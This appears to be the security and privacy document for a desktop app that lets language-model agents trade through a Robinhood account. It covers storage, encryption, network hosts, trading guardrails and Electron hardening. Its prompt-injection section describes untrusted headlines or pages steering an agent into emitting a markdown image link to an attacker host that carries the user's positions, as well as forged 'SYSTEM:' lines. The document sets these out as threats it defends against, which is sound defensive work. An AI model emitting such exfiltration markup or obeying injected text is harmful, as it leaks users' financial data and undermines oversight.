# Security and privacy

Robinhood Trading Agents connects a language model to a brokerage account. This document says plainly
what the app stores, where it stores it, what leaves your computer, and what stands between
a model's decision and your money. If you find a gap, please
[report it](#reporting-a-vulnerability).

---

## The short version

- **Local only.** There is no project server, account, analytics, crash reporting or
  auto-update. Nobody but you can see your agents, books or credentials.
- **Encrypted secrets.** Tokens and API keys are encrypted with your operating system's
  keychain through Electron `safeStorage`. Agent data is plain JSON in your user-data folder.
- **Only the services you connect.** The app talks to Robinhood, your model provider, and any
  data sources you switch on. Nothing else.
- **The engine places orders, not the model.** Every order passes the agent's guardrails
  first. New agents start in paper mode. Live trading is armed per agent, and a global halt
  stops live buys everywhere.

---

## Where your data lives

### The app's data folder

| OS | Location |
|---|---|
| Windows | `%APPDATA%\Robinhood Trading Agents` |
| macOS | `~/Library/Application Support/Robinhood Trading Agents` |
| Linux | `~/.config/Robinhood Trading Agents` |

```
Robinhood Trading Agents/
├─ settings.json                 theme, defaults, tool policy, trading halt     (plain JSON)
├─ layout.json                   sidebar groups and order                       (plain JSON)
├─ agents/<id>/
│   ├─ config.json               task, schedule, guardrails, model              (plain JSON)
│   ├─ state.json                book (cash, positions, fills), memory, exits   (plain JSON)
│   ├─ messages.jsonl            the thread                                     (plain JSON)
│   ├─ runs.jsonl                one record per run                             (plain JSON)
│   └─ decisions.jsonl           every allowed or blocked tool call             (plain JSON)
├─ local-engine-settings.json    local model engine settings
├─ local-engine.log              local model engine log
├─ claude-token.bin              Claude setup token, if you pasted one          (encrypted)
└─ credentials/
    ├─ robinhood.bin             Robinhood OAuth access + refresh tokens        (encrypted)
    ├─ chatgpt.bin               ChatGPT (Codex) OAuth tokens                   (encrypted)
    ├─ openrouter.bin            your OpenRouter API key                        (encrypted)
    ├─ market-stream.bin         your Alpaca market-data key                    (encrypted)
    └─ mcp-keys.bin              data-source keys (Alpha Vantage, Tiingo…)      (encrypted)
```

State files and secret files are written atomically (temp file → fsync → rename). An
unclean shutdown cannot leave half an agent's book on disk, or half a just-rotated refresh
token.

Agent ids are checked before they name a folder. Only ids of the shape the app itself mints
reach the disk, so no id can point a read or delete outside the agent's own folder.

### Outside the app's folder

These locations belong to other tools. The app reads them or causes them to be written.

| What | Where | Notes |
|---|---|---|
| Claude login | `~/.claude/.credentials.json` | Claude Code's own credential file. The app reads it and never copies it elsewhere. |
| Claude sessions | `~/.claude/projects/` | Claude agents resume their sessions, so Claude Code keeps those transcripts as it does for any Claude Code use. |
| Local models | the folder you choose | GGUF files are read in place, never copied. |
| Local model engine | `%LOCALAPPDATA%\Elyxndra\` (Windows), `~/Library/Application Support/Elyxndra/` (macOS), `~/.local/share/elyxndra/` (Linux) | Created by the llama.cpp engine package the app uses (`@elyxndra/engine`) the first time Local GPU runs: an `engine-secret` token that guards the engine's loopback port. |
| Data-source packages | npm / uv caches | Servers started with `npx` / `uvx` are downloaded and cached by those tools. |

### How secrets are encrypted

Every secret file goes through one implementation, `src/main/lib/secureFile.ts`, which uses
Electron `safeStorage`:

- **Windows:** DPAPI, tied to your Windows user account.
- **macOS:** the login Keychain.
- **Linux:** the desktop secret service (GNOME Keyring / KWallet) via libsecret.

> [!IMPORTANT]
> **The fallback is not encryption.** If no keychain backend is available, which is typical
> of a bare Linux install without a secret service, secrets are written base64-encoded with
> a `plain:` marker. Anyone who can read the file can then read them.
>
> If you run on such a system, set up a secret service or protect the folder yourself.

The renderer (the app's window) never receives a secret. Settings screens learn only whether a
key exists, plus the result of a connection test.

---

## What leaves your computer

The app makes network requests only to services you have connected or switched on:

| When | Host(s) | What is sent |
|---|---|---|
| Robinhood connected | `robinhood.com`, `api.robinhood.com`, `agent.robinhood.com` | OAuth sign-in and token refresh; MCP calls for quotes, positions, orders |
| Claude provider | Anthropic, via the Claude Agent SDK / Claude Code | Agent prompts and tool results. Claude Code's own telemetry follows your Claude Code settings; the app does not change them. |
| ChatGPT provider | `auth.openai.com`, `chatgpt.com` | Sign-in and token refresh; agent prompts and tool results |
| OpenRouter provider | `openrouter.ai` (then the model's host) | Agent prompts and tool results; a key check when you test the key |
| Market-data key | `data.alpaca.markets` | Symbols for quotes and bars |
| Data sources you enable | each provider's endpoint — e.g. `secedgar.caseyjhand.com` (a community-hosted SEC EDGAR server), `mcp.alphavantage.co`, `mcp.apify.com` | Their tool calls; local ones are fetched by `npx` / `uvx` |
| Local GPU | `127.0.0.1` only | Nothing leaves the machine |

**What a model provider sees.** Each run sends the agent's task, its book, recent thread
messages, quotes and tool results. Choose your provider with that in mind. A **Local GPU**
agent keeps all of it on your machine.

Sign-in callbacks use loopback addresses on your own machine:

- **Robinhood:** `127.0.0.1` on a random port.
- **ChatGPT:** `127.0.0.1:1455`, the port the Codex login flow requires.

There is no auto-updater. Builds are made from source with `publish: null`.

---

## Trading safety

The model never places a broker order directly. It asks the engine through a `trade` tool,
and the engine decides.

### Paper by default

- **New agents trade paper.** Simulated fills at real quotes; no money moves.
- **Templates are paper and ask-first.**
- **Duplicates start in paper too.**

### Live trading needs three things

1. Robinhood connected.
2. The agent switched to live.
3. Live trading **explicitly armed** for that agent.

A live agent trades from a sub-ledger of its own fills and can never sell more than it bought.
Its allocation must fit in the buying power the other live agents leave free.

### Guardrails

Every order is checked by one pure function, `src/core/broker/guardrails.ts`, before it goes
anywhere. The limits:

- order and position caps;
- orders per day;
- a daily-loss buy lock;
- market hours;
- an entry window;
- maximum extension above VWAP;
- per-symbol caps;
- a re-entry cooldown;
- settled cash.

Each refusal is written to the agent's decision log with a stable rule name.

### Approvals

Agents set to **Ask me first** hold every trade, exit change and retirement as an approval
card. Approving makes the agent re-check against the current price. An approval covers only
that one action.

### The trading halt

**Settings → Trading safety** refuses live **buys** on every agent at once.

- **Sells, stops and targets keep working,** so open positions can always be closed.
- **Paper agents are untouched.**

### Robinhood write tools

Robinhood's own order, cancel, watchlist and scan tools are **off** unless you enable them in
**Settings → Robinhood tools**. Even then, only live, armed agents can call them, and orders
placed through them still go through the guardrails.

### Exits

Exits run in code, not in the model:

- **Checked by the engine.** Stops, targets and trailing stops are checked every 15 seconds
  and at every run start.
- **When the price feed is down.** If the feed fails, the agent is told its exits are
  currently unenforced rather than reassured.

> [!CAUTION]
> These controls reduce risk; they do not remove it. A model can still make a bad trade
> inside its limits. Start in paper, keep allocations small, and read what your agents do.

---

## Prompt injection and untrusted text

Agents read text the app does not control: news headlines, SEC filings, fetched web pages,
and tool results.

- **Read-only research.** Data-source servers are read-only, and the model's broker tools are
  read-only unless you opt in.
- **One gate for every tool call.** Every call, on every model provider, passes through the
  same gate (`makeRunTool`): policy, the approval hold, a loop guard, then argument
  validation.
- **Untrusted text is neutralised.** Tool results are capped in size, and lines that imitate
  the app's own transcript format (for example `[10:31 AM ET] SYSTEM: …`) are rewritten so
  they cannot pass as an engine note (`src/shared/sanitize.ts`). The same applies to text an
  agent quotes into its own messages.
- **The decisive controls are not text.** The guardrails, the daily-loss lock, live arming
  and approvals are engine state. A forged sentence in a headline cannot lift them.
- **Agent prose fetches nothing by itself.** A model can be steered into writing
  `![](https://attacker.example/?d=<your positions>)`. The renderer shows an image in
  agent text as its alt text, never as an `<img>`, and the page's Content-Security-Policy
  refuses remote images anyway. A link only opens when you click it, and then in your
  browser.
- **Links are checked before the OS opens them.** Every URL handed to the operating
  system goes through one check (`src/shared/externalUrl.ts`): only absolute `https:`,
  `http:` and `mailto:` URLs pass. `file:`, `ms-msdt:`, `search-ms:`, UNC paths and
  scheme-less links never reach the shell.

## Credentials in logs and the thread

Error messages and stored tool results pass through `src/core/redact.ts` before they are
written to a thread, a run record or a notification. Query-string keys, `Bearer` / `Basic`
tokens, known key prefixes and `user:password@` URLs are stripped by name, not by guesswork.

## Electron hardening

- **Isolated renderer.** The renderer runs with `contextIsolation: true` and reaches the main
  process only through the typed `window.tb` bridge (`src/preload`).
- **The window shows only the app.** Every web contents refuses navigation to any other
  page, because the bridge would follow the main frame. New windows are denied (safe
  links open in your browser instead) and webviews are never attached.
- **Strict content policy.** The Content-Security-Policy allows scripts only from the app
  itself, and no remote images, plugins, `<base>` or form posts. Fonts are bundled, not
  fetched.
- **Narrow IPC writes.** `agents:update` accepts only the fields the settings sheet edits.
  Arming live trading goes through its own call, which checks the broker connection.
- **OAuth callback pages are escaped.** The loopback pages your browser sees after signing
  in escape anything they echo, and forbid scripts.
- **Known limitation:** the renderer is not sandboxed (`sandbox: false`), and IPC handlers do
  not check which frame sent a message. Both rely on the navigation guard above to keep
  foreign pages out of the window.

---

## Revoking access and wiping data

| To… | Do this |
|---|---|
| Disconnect Robinhood on this computer | **Settings → Connections → Robinhood → Disconnect.** This deletes the stored tokens. To revoke the grant itself, remove the connection in Robinhood. |
| Sign out of ChatGPT | **Settings → Connections → ChatGPT → Sign out** |
| Stop using Claude | **Settings → Connections → Claude → Sign out** clears a pasted setup token. To end the Claude Code login itself, run `claude logout` in a terminal. |
| Remove an API key | Clear it in **Connections** or **MCP servers**, and revoke it on the provider's site |
| Stop all live buying now | **Settings → Trading safety → halt** |
| Wipe everything | Quit the app and delete the data folder listed above. Delete `~/.claude/projects/` entries too if you used Claude. |

### Good practice

- **Protect your computer account.** Use a password on your OS account and turn on full-disk
  encryption (BitLocker / FileVault / LUKS). The keychain protects secrets from other users,
  not from someone logged in as you.
- **Don't share your data folder.** It holds your trading history; do not sync it or copy it
  to anyone.
- **Keep Robinhood write tools off** unless you have a specific reason to enable them.
- **Review exposure.** Check the decision log and the stats sheet's risk panel before raising
  an agent's limits.

---

## Third-party terms

You connect your own accounts and are responsible for each service's terms.

- **Robinhood:** its Customer Agreement governs Agentic Trading and API use.
- **Claude and ChatGPT:** both vendors restrict how subscription credentials may be used by
  third-party apps.

See [README → Third-party services and terms](README.md#third-party-services-and-terms).

## Reporting a vulnerability

Please **do not open a public issue** for a security problem. Use GitHub's private
vulnerability reporting instead: this repository's **Security** tab → **Report a
vulnerability**.

Include what you found, how to reproduce it, and what an attacker could do with it.
Particularly valuable:

- anything that lets a model, a tool result or fetched content bypass the guardrails or the
  approval hold;
- anything that leaks a credential.
